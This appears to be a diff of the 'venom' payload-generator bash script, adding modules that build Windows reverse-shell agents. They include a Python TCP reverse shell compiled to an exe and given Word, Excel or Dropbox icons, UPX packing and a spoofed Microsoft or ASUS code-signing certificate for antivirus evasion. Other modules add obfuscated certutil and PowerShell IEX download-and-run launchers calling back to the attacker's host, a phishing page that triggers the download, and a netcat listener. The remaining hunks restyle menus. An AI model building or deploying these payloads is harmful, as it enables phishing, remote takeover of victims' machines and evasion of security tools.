+## SIGN EXECUTABLE (paranoidninja - CarbonCopy)
+echo "${BlueF}[☠]${white} Sign Executable for AV Evasion .."${Reset};sleep 1
+# random produces a number from 1 to 6
+conv=$(cat /dev/urandom | tr -dc '1-6' | fold -w 1 | head -n 1)
+# if $conv number output 'its small than' number 3 ...
+if [ "$conv" "<" "3" ]; then SSL_domain="www.microsoft.com"; else SSL_domain="www.asus.com"; fi
+echo "${BlueF}[${YellowF}i${BlueF}]${white} spoofed certificate: $SSL_domain"${Reset};
+sleep 2
+cd $IPATH/obfuscate
+xterm -T "VENOM - Signs an Executable for AV Evasion" -geometry 110x23 -e "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$NaM.exe $IPATH/output/signed-$NaM.exe && sleep 2"
+mv $IPATH/output/signed-$NaM.exe $IPATH/output/$NaM.exe
+rm -r certs > /dev/nul 2>&1
+chmod +x $IPATH/output/$NaM.exe > /dev/nul 2>&1
+cd $IPATH/
+
+
+### change executable icon
+RhI="$HOME/.wine/drive_c/Program Files/Resource Hacker/ResourceHacker.exe"
+if [ -f "$RhI" ]; then
+    echo "${BlueF}[☠]${white} Changing $NaM.exe icon (ResourceHacker) .."${Reset};
+    sleep 2
+
+    IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "dropbox.ico" FALSE "Microsoft-Excel.ico" FALSE "Microsoft-Word.ico" FALSE "Steam-logo.ico" FALSE "Windows-black.ico" FALSE "Windows-Logo.ico" FALSE "Windows-Store.ico" FALSE "Input your own icon" --width 330 --height 330) > /dev/null 2>&1
+    if [ "$IcOn" = "Input your own icon" ]; then
+      ImR=$(zenity --title "☠ ICON REPLACEMENT ☠" --filename=$IPATH --file-selection --text "chose icon.ico to use") > /dev/null 2>&1
+      PaTh="$ImR"
+    else
+      PaTh="$IPATH/bin/icons/$IcOn"
+    fi
+    xterm -T "VENOM - RH change binary icon" -geometry 110x23 -e "$arch \"$RhI\" -open \"$IPATH/output/$NaM.exe\" -save \"$IPATH/output/$NaM.exe\" -action addskip -res \"$PaTh\" -mask ICONGROUP,MAINICON, && sleep 1"
+else
+    echo "${RedF}[x]${white} ResourceHacker.exe '->' not found!"${Reset};
+    sleep 1
+    # Installing Resource-Hacker.exe under wine ..
+    xterm -T "VENOM - Installing Module Dependencies" -geometry 110x23 -e "$arch $IPATH/bin/reshacker_setup.exe && sleep 3"
+    echo "${BlueF}[${YellowF}i${BlueF}]${white} Please wait, restarting tool .."${Reset};
+    exit
+fi
+
+
+## Copy files to apache2 webroot
+echo "${BlueF}[☠]${white} Copy files required to apache webroot .."${Reset};sleep 2
+chmod +x $IPATH/output/$NaM.exe > /dev/nul 2>&1
+cp $IPATH/output/$NaM.bat $ApAcHe/$NaM.bat > /dev/nul 2>&1
+cp $IPATH/output/$NaM.exe $ApAcHe/$NaM.exe > /dev/nul 2>&1
+cd $IPATH
+
+
+## Phishing webpage
+cd $IPATH/templates/phishing
+sed "s|NaM3|http://$lhost/$NaM.bat|g" mega.html > mega1.html
+mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
+cd $IPATH
+## Final displays to user
+echo "${BlueF}[${YellowF}i${BlueF}]${white} TRIGGER DOWNLOAD AT ${RedF}:${YellowF}http://$lhost/mega1.html"${Reset};
+sleep 2
+
+
+## START HANDLER
+xterm -T " NETCAT LISTENER - $lhost:$lport" -geometry 110x23 -e "sudo nc -lvp $lport"
+echo "---"
+sleep 2
+
+
+## Clean old files
+echo "${BlueF}[☠]${white} Please Wait,cleaning old files .."${Reset};
+rm $ApAcHe/$NaM.exe > /dev/nul 2>&1
+rm $ApAcHe/$NaM.bat > /dev/nul 2>&1
+rm $ApAcHe/mega1.html > /dev/nul 2>&1
+rm $IPATH/templates/evasion1/shell.o > /dev/nul 2>&1
+rm $IPATH/templates/evasion1/shell.base > /dev/nul 2>&1
+rm $IPATH/templates/evasion1/shell1.c > /dev/nul 2>&1
+rm $IPATH/templates/evasion1/shell.c > /dev/nul 2>&1
+rm $IPATH/templates/evasion1/shell.exe > /dev/nul 2>&1
+sh_menu
+}
+
+
+
+
+# --------------------------------------------------
+# Simple TCP reverse shell in PYTHON compiled to exe
+# --------------------------------------------------
+sh_evasion2 () {
+Colors;
+lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
+NaM=$(zenity --title="☠ Enter FILENAME ☠" --text "example: notepad" --entry --width 300) > /dev/null 2>&1
+
+## display final settings to user
+echo "${BlueF}[${YellowF}i${BlueF}]${white} MODULE SETTINGS"${Reset};
+echo "---"
+echo ${BlueF}
+cat << !
+    LPORT    : $lport
+    LHOST    : $lhost
+    LOLBin   : certutil
+    LAUNCHER : $IPATH/output/$NaM.bat
+    AGENT    : $IPATH/output/$NaM.exe
+
+!
+echo "---"
+
+
+## BUILD LAUNCHER
+echo "${BlueF}[☠]${white} Building Obfuscated bat Launcher .."${Reset};sleep 2
+echo "@echo off" > $IPATH/output/Launcher.bat
+echo "echo Please Wait, Installing Software .." >> $IPATH/output/Launcher.bat
+echo "certutil.exe -urlcache -split -f http://$lhost/$NaM.exe $NaM.exe && start $NaM.exe" >> $IPATH/output/Launcher.bat
+echo "exit" >> $IPATH/output/Launcher.bat
+cd $IPATH/output
+mv Launcher.bat $NaM.bat
+cd $IPATH
+
+
+## Reverse TCP shell in python (ReliK Inspired)
+echo "${BlueF}[*]${white} Writting TCP reverse shell to output."${Reset};
+sleep 2
+echo "#!/usr/bin/python" > $IPATH/output/Client_Shell.py
+echo "# Simple Reverse TCP Shell Written by: Dave Kennedy (ReL1K)" >> $IPATH/output/Client_Shell.py
+echo "# Copyright 2018 TrustedSec, LLC. All rights reserved." >> $IPATH/output/Client_Shell.py
+echo "##" >> $IPATH/output/Client_Shell.py
+echo "" >> $IPATH/output/Client_Shell.py
+echo "import socket" >> $IPATH/output/Client_Shell.py
+echo "import subprocess" >> $IPATH/output/Client_Shell.py
+echo "" >> $IPATH/output/Client_Shell.py
+echo "VOODOO = '$lhost'    # The remote lhost ip addr" >> $IPATH/output/Client_Shell.py
+echo "KUNGFU = $lport               # The same port as used by the server" >> $IPATH/output/Client_Shell.py
+echo "" >> $IPATH/output/Client_Shell.py
+echo "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)" >> $IPATH/output/Client_Shell.py
+echo "s.connect((VOODOO, KUNGFU))" >> $IPATH/output/Client_Shell.py
+echo "while 1:" >> $IPATH/output/Client_Shell.py
+echo "    data = s.recv(1024)" >> $IPATH/output/Client_Shell.py
+echo "    proc = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)" >> $IPATH/output/Client_Shell.py
+echo "    stdout_value = proc.stdout.read() + proc.stderr.read()" >> $IPATH/output/Client_Shell.py
+echo "    s.send(stdout_value)" >> $IPATH/output/Client_Shell.py
+echo "# quit out afterwards and kill socket" >> $IPATH/output/Client_Shell.py
+echo "s.close()" >> $IPATH/output/Client_Shell.py
+## Rename python client
+cp $IPATH/output/Client_Shell.py $IPATH/output/$NaM.py
+
+
+## COMPILE/CHANGE EXE ICON (pyinstaller)
+echo "${BlueF}[☠]${white} Changing $NaM.exe icon (pyinstaller) .."${Reset};
+sleep 2
+
+    ## Icon sellection
+    IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "dropbox.ico" FALSE "Microsoft-Excel.ico" FALSE "Microsoft-Word.ico" FALSE "Steam-logo.ico" FALSE "Windows-black.ico" FALSE "Windows-Logo.ico" FALSE "Windows-Store.ico" FALSE "Input your own icon" --width 330 --height 330) > /dev/null 2>&1
+    if [ "$IcOn" = "Input your own icon" ]; then
+      ImR=$(zenity --title "☠ ICON REPLACEMENT ☠" --filename=$IPATH --file-selection --text "chose icon.ico to use") > /dev/null 2>&1
+      PaTh="$ImR"
+    else
+      PaTh="$IPATH/bin/icons/$IcOn"
+    fi
+
+    ## Compile and change icon
+    cd $IPATH/output
+    xterm -T " PYINSTALLER " -geometry 110x23 -e "su $user -c '$arch c:/$PyIn/Python.exe c:/$PiWiN/pyinstaller.py --noconsole -i $PaTh --onefile $IPATH/output/Client_Shell.py'"
+
+    ## clean pyinstaller directory
+    mv $IPATH/output/dist/Client_Shell.exe $IPATH/output/Client_Shell.exe > /dev/null 2>&1
+    rm $IPATH/output/*.spec > /dev/null 2>&1
+    rm $IPATH/output/*.log > /dev/null 2>&1
+    rm -r $IPATH/output/dist > /dev/null 2>&1
+    rm -r $IPATH/output/build > /dev/null 2>&1
+
+
+## check UPX dependencie
+upx_packer=`which upx`
+if ! [ "$?" -eq "0" ]; then
+  echo "${RedF}[x]${white} UPX Packer not found, installing .."${Reset};sleep 2
+  echo "" && sudo apt-get install upx-ucl && echo ""
+fi
+
+
+## AV evasion (pack binary with UPX)
+echo "${BlueF}[☠]${white} Packing final executable with UPX .."${Reset};sleep 2
+echo ""
+upx -9 -v -o $NaM.exe Client_Shell.exe
+echo ""
+
+
+## Make sure CarbonCopy dependencies are installed
+ossl_packer=`which osslsigncode`
+if ! [ "$?" -eq "0" ]; then
+  echo "${RedF}[x]${white} osslsigncode Package not found, installing .."${Reset};sleep 2
+  echo "" && sudo apt-get install osslsigncode && pip3 install pyopenssl && echo ""
+fi
+
+
+## SIGN EXECUTABLE (paranoidninja - CarbonCopy)
+echo "${BlueF}[☠]${white} Sign Executable for AV Evasion .."${Reset};sleep 1
+# random produces a number from 1 to 6
+conv=$(cat /dev/urandom | tr -dc '1-6' | fold -w 1 | head -n 1)
+# if $conv number output 'its small than' number 3 ...
+if [ "$conv" "<" "3" ]; then SSL_domain="www.microsoft.com"; else SSL_domain="www.asus.com"; fi
+echo "${BlueF}[${YellowF}i${BlueF}]${white} spoofed certificate: $SSL_domain"${Reset};
+sleep 2
+cd $IPATH/obfuscate
+xterm -T "VENOM - Signs an Executable for AV Evasion" -geometry 110x23 -e "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$NaM.exe $IPATH/output/signed-$NaM.exe && sleep 2"
+mv $IPATH/output/signed-$NaM.exe $IPATH/output/$NaM.exe
+rm -r certs > /dev/nul 2>&1
+chmod +x $IPATH/output/$NaM.exe > /dev/nul 2>&1
+chmod +x $IPATH/output/$NaM.py > /dev/nul 2>&1
+cd $IPATH/
+
+
+## Copy files to apache2 webroot
+echo "${BlueF}[☠]${white} Copy files required to apache webroot .."${Reset};sleep 2
+cp $IPATH/output/$NaM.exe $ApAcHe/$NaM.exe > /dev/nul 2>&1
+cp $IPATH/output/$NaM.bat $ApAcHe/$NaM.bat > /dev/nul 2>&1
+rm $IPATH/output/Client_Shell.exe > /dev/nul 2>&1
+rm $IPATH/output/Client_Shell.py > /dev/nul 2>&1
+
+
+## Phishing webpage
+cd $IPATH/templates/phishing
+sed "s|NaM3|http://$lhost/$NaM.bat|g" mega.html > mega1.html
+mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
+cd $IPATH
+
+
+## Final displays to user
+echo "${BlueF}[${YellowF}i${BlueF}]${white} TRIGGER DOWNLOAD AT ${RedF}:${YellowF}http://$lhost/mega1.html"${Reset};
+sleep 2
+cd $IPATH
+
+
+## START HANDLER
+xterm -T " NETCAT LISTENER - $lhost:$lport" -geometry 110x23 -e "sudo nc -lvp $lport"
+echo "---"
+sleep 2
+
+
+## Clean old files
+echo "${BlueF}[☠]${white} Please Wait,cleaning old files .."${Reset};
+rm $ApAcHe/$NaM.exe > /dev/nul 2>&1
+rm $ApAcHe/$NaM.bat > /dev/nul 2>&1
+rm $ApAcHe/mega1.html > /dev/nul 2>&1
+sh_menu
+}
+
+
+
+
+# --------------------------------------------------
+# Simple TCP reverse shell in PYTHON compiled to exe
+# -------------------------------------------------
+sh_evasion3 () {
+## TODO: msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=666 --encrypt rc4 --encrypt-key thisisakey -f c -o chars.raw
+# https://gist.github.com/r00t-3xp10it/fc690dc4abb20858e469d8df8ceb19b2#gistcomment-2952073
+Colors;
+lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
+NaM=$(zenity --title="☠ Enter FILENAME ☠" --text "example: notepad" --entry --width 300) > /dev/null 2>&1
+
+## display final settings to user
+echo "${BlueF}[${YellowF}i${BlueF}]${white} MODULE SETTINGS"${Reset};
+echo "---"
+echo ${BlueF}
+cat << !
+    LPORT    : $lport
+    LHOST    : $lhost
+    LOLBin   : certutil
+    LAUNCHER : $IPATH/output/$NaM.bat
+    AGENT    : $IPATH/obfuscate/evasion/powercat.ps1
+
+!
+echo "---"
+
+
+## LAUNCHER
+# $proxy=new-object -com WinHttp.WinHttpRequest.5.1;$proxy.open('GET','http://$lhost/powercat.ps1',$false);$proxy.send();powershell -C "[char]73+[char]69+[char]88";$proxy.responseText;powercat -c $lhost -p $lport -e cmd
+echo "${BlueF}[☠]${white} Building Obfuscated bat Launcher .."${Reset};
+sleep 2
+echo "@echo off&&powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://$lhost/powercat.ps1');powercat -c $lhost -p $lport -e cmd\"&&exit" > $IPATH/output/$NaM.bat
+
+
+## Copy files to apache2 webroot
+echo "${BlueF}[☠]${white} Copy files required to apache webroot .."${Reset};sleep 2
+cp $IPATH/templates/evasion3/powercat.ps1 $ApAcHe/powercat.ps1 > /dev/nul 2>&1
+cp $IPATH/output/$NaM.bat $ApAcHe/$NaM.bat > /dev/nul 2>&1
+
+
+## Phishing webpage
+cd $IPATH/templates/phishing
+sed "s|NaM3|http://$lhost/$NaM.bat|g" mega.html > mega1.html
+mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
+cd $IPATH
+
+
+## Final displays to user
+echo "${BlueF}[${YellowF}i${BlueF}]${white} TRIGGER DOWNLOAD AT ${RedF}:${YellowF}http://$lhost/mega1.html"${Reset};sleep 2
+cd $IPATH
+
+
+## START HANDLER
+xterm -T " NETCAT LISTENER - $lhost:$lport" -geometry 110x23 -e "sudo nc -lvp $lport"
+echo "---"
+sleep 2
+
+
+## Clean old files
+echo "${BlueF}[☠]${white} Please Wait,cleaning old files .."${Reset};
+rm $ApAcHe/$NaM.bat > /dev/nul 2>&1
+rm $ApAcHe/mega1.html > /dev/nul 2>&1
+rm $ApAcHe/powercat.ps1 > /dev/nul 2>&1
+sh_menu
+}
+
+
+
+
+# -------------------------------------------
+# Simple TCP reverse shell in PS1 (agent.ps1)
+# -------------------------------------------
+sh_evasion4 () {
+Colors;
+lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
+NaM=$(zenity --title="☠ Enter FILENAME ☠" --text "example: notepad" --entry --width 300) > /dev/null 2>&1
+
+## display final settings to user
+echo "${BlueF}[${YellowF}i${BlueF}]${white} MODULE SETTINGS"${Reset};
+echo ${BlueF}"---"
+cat << !
+    LPORT    : $lport
+    LHOST    : $lhost
+    LOLBin   : certutil
+    LAUNCHER : $IPATH/output/$NaM.bat
+    AGENT    : $IPATH/output/$NaM.ps1
+!
+echo "---"
+
+
+## parsing ip addr ranges into fields (payload.ps1)
+echo "${BlueF}[☠]${white} parsing ip addr ranges into fields .."${Reset};
+sleep 2
+one=$(echo $lhost|cut -d '.' -f1)
+two=$(echo $lhost|cut -d '.' -f2)
+tre=$(echo $lhost|cut -d '.' -f3)
+four=$(echo $lhost|cut -d '.' -f4)
+# split ip addr into 2 fields (launcher.bat)
+splt1=$(echo $lhost | cut -d '.' -f1,2)
+splt2=$(echo $lhost | cut -d '.' -f3,4)
+
+## convert all ip ranges fields into hex (payload.ps1)
+echo "${BlueF}[☠]${white} convert ip ranges fields into hex .."${Reset};
+sleep 2
+loot=$(printf "%x,%x,%x,%x\n" $one $two $tre $four)
+echo "${BlueF}[${YellowF}i${BlueF}]${white} ip${RedF}:${white}$lhost ${YellowF}=>${white} hex${RedF}:${white}$loot"${Reset};
+sleep 2
+
+## parsing hex fields (payload.ps1)
+um=$(echo $loot|cut -d ',' -f1)
+dois=$(echo $loot|cut -d ',' -f2)
+frt=$(echo $loot|cut -d ',' -f3)
+qua=$(echo $loot|cut -d ',' -f4)
+
+
+## inject obfuscated (hex) ip addr into template (payload.ps1)
+echo "${BlueF}[☠]${white} inject obfuscated (hex) addr into payload .."${Reset};
+sleep 2
+cd $IPATH/templates/evasion4
+cp powershell.ps1 powershell.bak
+sed -i "s|rEp|$um|" powershell.ps1
+sed -i "s|Ola|$dois|" powershell.ps1
+sed -i "s|DoI|$frt|" powershell.ps1
+sed -i "s|Fif|$qua|" powershell.ps1
+sed -i "s|PoRt|$lport|" powershell.ps1
+
+
+## copy files to output folder
+mv $IPATH/templates/evasion4/powershell.ps1 $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
+mv powershell.bak powershell.ps1 > /dev/nul 2>&1
+
+
+## LAUNCHER (launcher.bat)
+echo "${BlueF}[☠]${white} Building Obfuscated bat Launcher .."${Reset};
+sleep 2
+# echo "@echo off&&powershell IEX (New-Object Net.WebClient).DownloadString('http://$lhost/$NaM.ps1')" > $IPATH/output/$NaM.bat
+# echo "@echo off&&certutil.exe -urlcache -split -f http://$lhost/$NaM.ps1 $NaM.ps1 && start $NaM.ps1" > $IPATH/output/$NaM.bat
+# $proxy=new-object -com WinHttp.WinHttpRequest.5.1;$proxy.open('GET','http://$lhost/$NaM.ps1',$false);$proxy.send();powershell -C "[char]73+[char]69+[char]88";$proxy.responseText;Start-Process -FilePath "./$NaM.ps1" -Wait -WindowStyle Minimized
+## Obfuscated bat launcher
+echo "@e%!%ch^O ,;, Of^f&&(,(,, (,;sEt i0=f&&sEt T0=$splt1&&sEt NULL=$splt2&&@e%!%ch^O please wait, installing software.&&@cErt^uT%OKEN%il.ex%HUB%e -u%TOKEN%rl%char[0..3]%ca%F%che -sp%d0b%lit -%i0% http://%T0%.%NULL%/$NaM.ps1 $NaM.ps1),) %i% ,,)&&(,(; st%db%art $NaM.ps1), %char[0..5]%)&&eXit" > $IPATH/output/$NaM.bat
+
+
+## Copy files to apache2 webroot
+echo "${BlueF}[☠]${white} Copy files required to apache webroot .."${Reset};sleep 2
+cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
+cp $IPATH/output/$NaM.bat $ApAcHe/$NaM.bat > /dev/nul 2>&1
+
+
+## Phishing webpage
+cd $IPATH/templates/phishing
+sed "s|NaM3|http://$lhost/$NaM.bat|g" mega.html > mega1.html
+mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
+cd $IPATH
+
+
+## Final displays to user
+echo "${BlueF}[${YellowF}i${BlueF}]${white} TRIGGER DOWNLOAD AT ${RedF}:${YellowF}http://$lhost/mega1.html"${Reset};
+sleep 2
+cd $IPATH
+
+
+## START HANDLER
+xterm -T " NETCAT LISTENER - $lhost:$lport" -geometry 110x23 -e "sudo nc -lnvp $lport"
+echo "---"
+sleep 2
+
+
+## Clean old files
+echo "${BlueF}[☠]${white} Please Wait,cleaning old files .."${Reset};
+rm $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
+rm $ApAcHe/$NaM.bat > /dev/nul 2>&1
+rm $ApAcHe/mega1.html > /dev/nul 2>&1
+sh_menu
+}
+
+
+
+
+# ------------------------------
+# SUB-MENUS (payload categories)
+# ------------------------------
+sh_unix_menu () {
+echo ${BlueF}[☠]${white} Loading ${YellowF}[Unix]${white} agents ..${Reset};
+sleep 2
 cat << !
 
 
@@ -10789,38 +11802,47 @@ cat << !
     | TARGET SYSTEMS     : Linux|Bsd|Solaris
     | SHELLCODE FORMAT   : ELF
     | AGENT EXTENSION    : ELF
-    | AGENT EXECUTION    : press to exec (elf)
+    | AGENT EXECUTION    : sudo ./agent.elf
     | DETECTION RATIO    : https://goo.gl/YpyYwk
+
+    AGENT Nº4:
+    ╔──────────────────────────────────────────────────────────────
+    | TARGET SYSTEMS     : Linux
+    | SHELLCODE FORMAT   : C
+    | AGENT EXTENSION    : deb
+    | AGENT EXECUTION    : sudo ./agent.deb
+    | DETECTION RATIO    : https://goo.gl/naohaainda
 
 
     ╔─────────────────────────────────────────────────────────────╗
-    |   M    - Return to main menu                                |
-    |   E    - Exit venom Framework                               |
+    ║   M    - Return to main menu                                ║
+    ║   E    - Exit venom Framework                               ║
     ╚─────────────────────────────────────────────────────────────╝
 
 
 !
-echo "[☠] Shellcode Generator"
+echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
 sleep 1
-echo -n "[➽] Chose Agent number:"
+echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Agent number:${Reset}
 read choice
 case $choice in
 1) sh_shellcode1 ;;
 2) sh_shellcode20 ;;
 3) sh_elf ;;
-M) sh_menu ;;
-m) sh_menu ;;
-e) sh_exit ;;
-E) sh_exit ;;
-*) echo "\"$choice\": is not a valid Option"; sleep 2; clear; sh_unix_menu ;;
+4) sh_debian ;;
+m|M) sh_menu ;;
+e|E) sh_exit ;;
+*) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_unix_menu ;;
 esac
 }
 
 
-
+# ------------------------
+# MICROSOFT BASED PAYLOADS
+# ------------------------
 sh_microsoft_menu () {
-echo "[☠] Loading Microsoft agents .."
-sleep 1
+echo ${BlueF}[☠]${white} Loading ${YellowF}[Microsoft]${white} agents ..${Reset};
+sleep 2
 cat << !
 
 
@@ -10987,15 +12009,15 @@ cat << !
 
 
     ╔─────────────────────────────────────────────────────────────╗
-    |   M    - Return to main menu                                |
-    |   E    - Exit venom Framework                               |
+    ║   M    - Return to main menu                                ║
+    ║   E    - Exit venom Framework                               ║
     ╚─────────────────────────────────────────────────────────────╝
 
 
 !
-echo "[☠] Shellcode Generator"
+echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
 sleep 1
-echo -n "[➽] Chose Agent number:"
+echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Agent number:${Reset}
 read choice
 case $choice in
 1) sh_shellcode2 ;;
@@ -11018,20 +12040,20 @@ case $choice in
 18) sh_shellcode25 ;;
 19) sh_shellcodecsharp ;;
 20) sh_certutil ;;
-M) sh_menu ;;
-m) sh_menu ;;
-e) sh_exit ;;
-E) sh_exit ;;
-*) echo "\"$choice\": is not a valid Option"; sleep 2; clear; sh_microsoft_menu ;;
+m|M) sh_menu ;;
+e|E) sh_exit ;;
+*) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_microsoft_menu ;;
 esac
 }
 
 
 
-
+# ---------------
+# MULTI-ARCH MENU
+# ---------------
 sh_multi_menu () {
-echo "[☠] Loading Multi-OS agents .."
-sleep 1
+echo ${BlueF}[☠]${white} Loading ${YellowF}[Multi-OS]${white} agents ..${Reset};
+sleep 2
 cat << !
 
 
@@ -11069,34 +12091,35 @@ cat << !
 
 
     ╔─────────────────────────────────────────────────────────────╗
-    |   M    - Return to main menu                                |
-    |   E    - Exit venom Framework                               |
+    ║   M    - Return to main menu                                ║
+    ║   E    - Exit venom Framework                               ║
     ╚─────────────────────────────────────────────────────────────╝
 
 
 !
-echo "[☠] Shellcode Generator"
+echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
 sleep 1
-echo -n "[➽] Chose Agent number:"
+echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Agent number:${Reset}
 read choice
 case $choice in
 1) sh_shellcode17 ;;
 2) sh_shellcode18 ;;
 3) sh_shellcode19 ;;
 4) sh_shellcode26 ;;
-M) sh_menu ;;
-m) sh_menu ;;
-e) sh_exit ;;
-E) sh_exit ;;
-*) echo "\"$choice\": is not a valid Option"; sleep 2; clear; sh_multi_menu ;;
+m|M) sh_menu ;;
+e|E) sh_exit ;;
+*) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_multi_menu ;;
 esac
 }
 
 
 
+# -----------------
+# ANDRROID|IOS MENU
+# -----------------
 sh_android_menu () {
-echo "[☠] Loading Android|IOS agents .."
-sleep 1
+echo "${BlueF}[☠]${white} Loading ${YellowF}[Android|IOS]${white} agents .."${Reset};
+sleep 2
 cat << !
 
 
@@ -11119,32 +12142,33 @@ cat << !
 
 
     ╔─────────────────────────────────────────────────────────────╗
-    |   M    - Return to main menu                                |
-    |   E    - Exit venom Framework                               |
+    ║   M    - Return to main menu                                ║
+    ║   E    - Exit venom Framework                               ║
     ╚─────────────────────────────────────────────────────────────╝
 
 
 !
-echo "[☠] Shellcode Generator"
+echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
 sleep 1
-echo -n "[➽] Chose Agent number:"
+echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Agent number:${Reset}
 read choice
 case $choice in
 1) sh_shellcode21 ;;
 2) sh_macho ;;
-M) sh_menu ;;
-m) sh_menu ;;
-e) sh_exit ;;
-E) sh_exit ;;
-*) echo "\"$choice\": is not a valid Option"; sleep 2; clear; sh_android_menu ;;
+m|M) sh_menu ;;
+e|E) sh_exit ;;
+*) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_android_menu ;;
 esac
 }
 
 
 
+# -------------
+# WEBSHELL MENU
+# -------------
 sh_webshell_menu () {
-echo "[☠] Loading webshell agents .."
-sleep 1
+echo ${BlueF}[☠]${white} Loading ${YellowF}[webshell]${white} agents ..${Reset};
+sleep 2
 cat << !
 
 
@@ -11175,35 +12199,34 @@ cat << !
 
 
     ╔─────────────────────────────────────────────────────────────╗
-    |   M    - Return to main menu                                |
-    |   E    - Exit venom Framework                               |
+    ║   M    - Return to main menu                                ║
+    ║   E    - Exit venom Framework                               ║
     ╚─────────────────────────────────────────────────────────────╝
 
 
 !
-echo "[☠] Shellcode Generator"
+echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
 sleep 1
-echo -n "[➽] Chose Agent number:"
+echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Agent number:${Reset};
 read choice
 case $choice in
 1) sh_shellcode16 ;;
 2) sh_webshellbase ;;
 3) sh_webshellunix ;;
-M) sh_menu ;;
-m) sh_menu ;;
-e) sh_exit ;;
-E) sh_exit ;;
-*) echo "\"$choice\": is not a valid Option"; sleep 2; clear; sh_webshell_menu ;;
+m|M) sh_menu ;;
+e|E) sh_exit ;;
+*) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_webshell_menu ;;
 esac
 }
 
 
 
-
-
+# -------------------
+# MICOSOFT OFICE MENU
+# -------------------
 sh_world () {
-echo "[☠] Loading Office word agents .."
-sleep 1
+echo ${BlueF}[☠]${white} Loading ${YellowF}[Office word]${white} agents ..${Reset};
+sleep 2
 # module description
 cat << !
 
@@ -11234,28 +12257,25 @@ cat << !
 
 
     ╔─────────────────────────────────────────────────────────────╗
-    |   M    - Return to main menu                                |
-    |   E    - Exit venom Framework                               |
+    ║   M    - Return to main menu                                ║
+    ║   E    - Exit venom Framework                               ║
     ╚─────────────────────────────────────────────────────────────╝
 
 
 !
-echo "[☠] Shellcode Generator"
+echo ${BlueF}[☠]${white} Shellcode Generator${Reset}
 sleep 1
-echo -n "[➽] Chose Agent number:"
+echo -n ${BlueF}[${GreenF}➽${BlueF}]${white} Chose Agent number:${Reset}
 read choice
 case $choice in
 1) sh_world23 ;;
 2) sh_world24 ;;
 3) sh_world25 ;;
-M) sh_menu ;;
-m) sh_menu ;;
-e) sh_exit ;;
-E) sh_exit ;;
-*) echo "\"$choice\": is not a valid Option"; sleep 2; clear; sh_world ;;
+m|M) sh_menu ;;
+e|E) sh_exit ;;
+*) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_world ;;
 esac
 }
-
 
 
 
@@ -11270,32 +12290,33 @@ echo "main menu" > /dev/null 2>&1
 # Loop forever
 while :
 do
-clear
+clear && echo ${BlueF}
 cat << !
-
-            __    _ ______  ____   _  _____  ____    __  
+            __    _ ______  ____   _  _____  ____    __
            \  \  //|   ___||    \ | |/     \|    \  /  |
             \  \// |   ___||     \| ||     ||     \/   |
              \__/  |______||__/\____|\_____/|__/\__/|__|$ver
-     USER:$user ENV:$EnV INTERFACE:$InT3R ARCH:$ArCh DISTRO:$DiStR0
-    ╔─────────────────────────────────────────────────────────────╗
-    |   1 - Unix based payloads                                   |
-    |   2 - Windows-OS payloads                                   |
-    |   3 - Multi-OS payloads                                     |
-    |   4 - Android|IOS payloads                                  |
-    |   5 - Webserver payloads                                    |
-    |   6 - Microsoft office payloads                             |
-    |   7 - System built-in shells                                |
-    |                                                             |
-    |   E - Exit Shellcode Generator                              |
-    ╚─────────────────────────────────────────────────────────────╣
-                                                 SSA-RedTeam@2017_|
-
-
 !
-echo "[☠] Shellcode Generator"
+echo "     ${BlueF}USER:${YellowF}$user ${BlueF}ENV:${YellowF}$EnV ${BlueF}INTERFACE:${YellowF}$InT3R ${BlueF}ARCH:${YellowF}$ArCh ${BlueF}DISTRO:${YellowF}$DiStR0"${BlueF}
+cat << !
+    ╔─────────────────────────────────────────────────────────────╗
+    ║   1 - Unix based payloads                                   ║
+    ║   2 - Windows-OS payloads                                   ║
+    ║   3 - Multi-OS payloads                                     ║
+    ║   4 - Android|IOS payloads                                  ║
+    ║   5 - Webserver payloads                                    ║
+    ║   6 - Microsoft office payloads                             ║
